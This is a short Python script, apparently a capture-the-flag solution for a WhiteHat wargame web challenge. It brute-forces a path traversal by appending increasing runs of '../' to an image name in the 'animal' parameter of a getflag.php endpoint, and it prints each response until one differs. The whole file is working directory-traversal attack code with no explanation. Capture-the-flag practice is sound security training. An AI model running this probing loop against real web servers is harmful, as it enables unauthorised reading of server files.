import requests
import sys

url = 'http://lab10.wargame.whitehat.vn/contests/8/web100_b4e34d49ab55db5034d7fd5cc857e0f9/getflag.php?animal='

for a in range(100):
	path = url+'../'*a+'dog.jpg'
	print path
	r = requests.get(path)
	print r.status_code
	print r.text.find('cat.jpg')
	if (r.text.find('cat.jpg') == -1):
		print r.text
		sys.exit('finded')
